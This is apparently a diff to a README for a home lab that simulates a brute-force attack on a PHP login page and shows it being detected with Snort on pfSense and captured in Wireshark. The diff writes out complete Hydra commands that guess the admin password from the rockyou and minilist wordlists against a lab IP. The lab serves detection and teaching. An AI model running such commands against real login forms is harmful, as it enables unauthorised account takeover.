@@ -26,6 +26,8 @@ This project simulates a brute-force attack on a web login form and demonstrates
 1. Login portal hosted on Nginx using PHP (`index.php`)
 2. Hydra brute-forces login:
    ```bash
-   hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/index.php:username=^USER^&password=^PASS^:Login Failed" -V
+   hydra -l admin -P /home/vboxuser/rockyou.txt 192.168.1.10 http-post-form "/index.php:username=^USER^&password=^PASS^:Login Failed" -V
+      or
+   hydra -l admin -P /home/vboxuser/minilist.txt 192.168.1.10 http-post-form "/index.php:username=^USER^&password=^PASS^:Login Failed" -V
 3. Snort (on pfSense) detects and logs the attack
 4.Wireshark captures POST payloads on lo interface and shows username/password attempts
